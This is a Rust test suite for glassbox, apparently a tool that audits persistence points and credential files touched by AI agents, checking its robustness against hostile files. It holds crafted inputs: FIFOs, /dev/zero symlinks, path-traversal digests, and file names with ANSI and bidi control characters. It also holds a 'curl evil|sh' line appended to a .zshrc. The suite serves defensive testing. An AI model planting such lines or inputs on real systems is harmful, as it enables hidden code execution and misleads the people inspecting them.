//! One test per finding from the independent code review: hostile files that the
//! audited agents can create must never hang, exhaust, blind or mislead glassbox.
use glassbox::json;
use std::fs;
use std::os::unix::fs::symlink;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

fn scratch(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("glassbox-hostile-{}-{name}", std::process::id()));
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(&dir).unwrap();
    dir
}

/// Run glassbox; fail the test if it has not finished within 10 seconds.
fn run(args: &[&str], home: &Path) -> (i32, String) {
    let mut child = Command::new(env!("CARGO_BIN_EXE_glassbox"))
        .args(args)
        .arg("--home")
        .arg(home)
        .current_dir(home)
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .unwrap();
    let start = Instant::now();
    while child.try_wait().unwrap().is_none() {
        if start.elapsed() > Duration::from_secs(10) {
            child.kill().unwrap();
            panic!("glassbox {args:?} hung");
        }
        std::thread::sleep(Duration::from_millis(20));
    }
    let out = child.wait_with_output().unwrap();
    (out.status.code().unwrap_or(-1), String::from_utf8_lossy(&out.stdout).into_owned())
}

fn mkfifo(path: &Path) {
    assert!(Command::new("mkfifo").arg(path).status().unwrap().success());
}

fn autostart_dir(home: &Path) -> PathBuf {
    let dir = if cfg!(target_os = "macos") { home.join("Library/LaunchAgents") } else { home.join(".config/systemd/user") };
    fs::create_dir_all(&dir).unwrap();
    dir
}

#[test]
fn fifo_in_a_watched_directory_does_not_hang_persist() {
    let home = scratch("fifo");
    mkfifo(&autostart_dir(&home).join("x.plist"));
    let (code, json) = run(&["persist", "--json"], &home);
    assert_eq!(code, 0);
    assert!(json.contains("x.plist"), "the FIFO is still listed as a persistence point: {json}");
}

#[test]
fn symlink_to_dev_zero_does_not_exhaust_memory() {
    let home = scratch("zero");
    fs::create_dir_all(home.join(".config/fish/conf.d")).unwrap();
    symlink("/dev/zero", home.join(".config/fish/conf.d/x.fish")).unwrap();
    symlink("/dev/zero", home.join(".claude.json")).unwrap();
    assert_eq!(run(&["persist"], &home).0, 0);
}

#[test]
fn fifo_in_place_of_a_credential_does_not_hang_reach() {
    let home = scratch("reach-fifo");
    mkfifo(&home.join(".netrc"));
    let (code, json) = run(&["reach", "--json"], &home);
    assert_eq!(code, 0);
    assert!(json.contains("\"path\":\"~/.netrc\""), "{json}");
}

#[test]
fn ollama_digest_cannot_leave_the_blob_directory() {
    let home = scratch("traversal");
    let models = home.join(".ollama/models");
    fs::create_dir_all(models.join("manifests/registry.ollama.ai/library/m")).unwrap();
    fs::create_dir_all(models.join("blobs/sha256-x")).unwrap();
    mkfifo(&home.join("fifo"));
    fs::write(home.join("outside.gguf"), b"not a blob").unwrap();
    for (tag, digest) in [("a", "sha256:x/../../../fifo"), ("b", "sha256:x/../../../outside.gguf")] {
        fs::write(
            models.join(format!("manifests/registry.ollama.ai/library/m/{tag}")),
            format!(r#"{{"layers":[{{"mediaType":"application/vnd.ollama.image.model","digest":"{digest}"}}]}}"#),
        )
        .unwrap();
    }
    let (code, json) = run(&["models", "--json"], &home);
    assert_eq!((code, json.trim()), (0, r#"{"models":[]}"#));
}

#[test]
fn a_deep_unrelated_subtree_does_not_disable_keyed_hashing() {
    let home = scratch("deep-subtree");
    let deep = "[".repeat(300) + &"]".repeat(300);
    let write = |counter: u32, mcp: &str| {
        fs::write(
            home.join(".claude.json"),
            format!(r#"{{"numStartups":{counter},"projects":{{"/w":{{"cache":{deep}{mcp}}}}}}}"#),
        )
        .unwrap();
    };
    write(1, "");
    let snap = home.with_extension("snapshot");
    assert_eq!(run(&["persist", "--save", snap.to_str().unwrap()], &home).0, 0);
    write(2, "");
    assert_eq!(run(&["persist", "--since", snap.to_str().unwrap(), "--strict"], &home).0, 0, "counter change flagged");
    write(3, r#","mcpServers":{"x":{"command":"/tmp/x"}}"#);
    assert_eq!(run(&["persist", "--since", snap.to_str().unwrap(), "--strict"], &home).0, 1, "new MCP server missed");
}

#[test]
fn control_characters_in_names_are_escaped_in_text_output() {
    let home = scratch("ansi");
    fs::write(autostart_dir(&home).join("evil.plist\u{1b}[2K\r"), b"x").unwrap();
    let (_, text) = run(&["persist"], &home);
    assert!(!text.contains('\u{1b}') && !text.contains('\r'), "raw control characters reached the terminal");
    assert!(text.contains("evil.plist\\x1b[2K\\r"), "{text}");
}

#[test]
fn an_option_is_never_taken_as_another_options_value() {
    let home = scratch("args");
    assert_eq!(run(&["persist", "--save", "--json"], &home).0, 2);
    assert!(!home.join("--json").exists(), "a file named --json was written");
    let (code, _) = Command::new(env!("CARGO_BIN_EXE_glassbox"))
        .args(["reach", "--home", "--strict"])
        .output()
        .map(|o| (o.status.code().unwrap(), ()))
        .unwrap();
    assert_eq!(code, 2);
}

#[test]
fn strict_without_since_and_repeated_options_are_usage_errors() {
    let home = scratch("strict");
    let snap = home.with_extension("snapshot");
    assert_eq!(run(&["persist", "--strict", "--save", snap.to_str().unwrap()], &home).0, 2);
    assert_eq!(run(&["persist", "--strict"], &home).0, 2);
    assert_eq!(run(&["persist", "--save", "a", "--save", "b"], &home).0, 2);
}

#[test]
fn surrogate_pairs_are_decoded_so_different_characters_differ() {
    let a = json::parse(r#""😀""#).unwrap();
    let b = json::parse(r#""😁""#).unwrap();
    assert_eq!(a, json::Value::Str("\u{1F600}".into()));
    assert_ne!(a.canonical(), b.canonical());
    // Lone surrogates stay distinct from each other.
    assert_ne!(json::parse(r#""\ud800""#).unwrap().canonical(), json::parse(r#""\ud801""#).unwrap().canonical());
}

#[test]
fn invalid_json_is_rejected_like_a_real_parser() {
    for bad in [r#""\u+041""#, r#""\x""#, r#"{"hooks": e}"#, "01", "1.", "-", "1e", "\"a\u{1}b\"", "+1"] {
        assert_eq!(json::parse(bad), None, "{bad:?} must not parse");
    }
    for good in ["0", "-0.5e+10", "1E3", r#""\/\b\f\n\r\t\"\\""#, "[1,2]", "{}"] {
        assert!(json::parse(good).is_some(), "{good:?} must parse");
    }
}

#[test]
fn a_path_ending_in_carriage_return_round_trips_through_a_snapshot() {
    let home = scratch("cr");
    fs::write(autostart_dir(&home).join("x.plist\r"), b"x").unwrap();
    let snap = home.with_extension("snapshot");
    assert_eq!(run(&["persist", "--save", snap.to_str().unwrap()], &home).0, 0);
    let (code, json) = run(&["persist", "--since", snap.to_str().unwrap(), "--strict", "--json"], &home);
    assert_eq!((code, json.trim()), (0, r#"{"changes":[]}"#));
}

// Second review round.

#[test]
fn a_same_size_edit_past_any_cap_is_detected() {
    let home = scratch("big-zshrc");
    let mut body = vec![b'#'; 17 << 20];
    body.push(b'\n');
    fs::write(home.join(".zshrc"), &body).unwrap();
    let snap = home.with_extension("snapshot");
    assert_eq!(run(&["persist", "--save", snap.to_str().unwrap()], &home).0, 0);
    let tail = b"curl evil|sh\n";
    let at = body.len() - tail.len();
    body[at..].copy_from_slice(tail);
    fs::write(home.join(".zshrc"), &body).unwrap();
    assert_eq!(run(&["persist", "--since", snap.to_str().unwrap(), "--strict"], &home).0, 1);
}

#[test]
fn invalid_json_beyond_the_depth_limit_is_rejected() {
    let deep = "[".repeat(300);
    for tail in ["} 1 2 ]", "{\"a\" 1 2 3]", "1,]"] {
        let text = format!("{deep}{tail}{}", "]".repeat(299));
        assert_eq!(json::parse(&text), None, "{tail}");
    }
    let valid = format!("{}{{\"a\": [1, \"]\"]}}{}", "[".repeat(300), "]".repeat(300));
    assert!(json::parse(&valid).is_some());
}

#[test]
fn a_fifo_in_place_of_the_snapshot_does_not_hang() {
    let home = scratch("snap-fifo");
    let snap = home.join("before.snapshot");
    mkfifo(&snap);
    assert_eq!(run(&["persist", "--since", snap.to_str().unwrap()], &home).0, 2);
}

#[test]
fn a_huge_sparse_model_file_does_not_exhaust_memory() {
    let home = scratch("sparse");
    let dir = home.join(".lmstudio/models/x/y");
    fs::create_dir_all(&dir).unwrap();
    fs::File::create(dir.join("z.gguf")).unwrap().set_len(1 << 40).unwrap();
    let (code, json) = run(&["models", "--json"], &home);
    assert_eq!(code, 0);
    assert!(json.contains("\"bytes\":1099511627776"), "{json}");
}

#[test]
fn a_lone_surrogate_differs_from_the_same_text_with_a_backslash() {
    let lone = json::parse(r#""\ud800""#).unwrap().canonical();
    let text = json::parse(r#""\\ud800""#).unwrap().canonical();
    assert_ne!(lone, text);
}

#[test]
fn bidi_and_zero_width_characters_are_escaped_in_text_output() {
    let home = scratch("bidi");
    fs::write(autostart_dir(&home).join("evil\u{202e}tsil.plist\u{200b}"), b"x").unwrap();
    let (_, text) = run(&["persist"], &home);
    assert!(!text.contains('\u{202e}') && !text.contains('\u{200b}'), "{text}");
    assert!(text.contains("evil\\u202etsil.plist\\u200b"), "{text}");
}
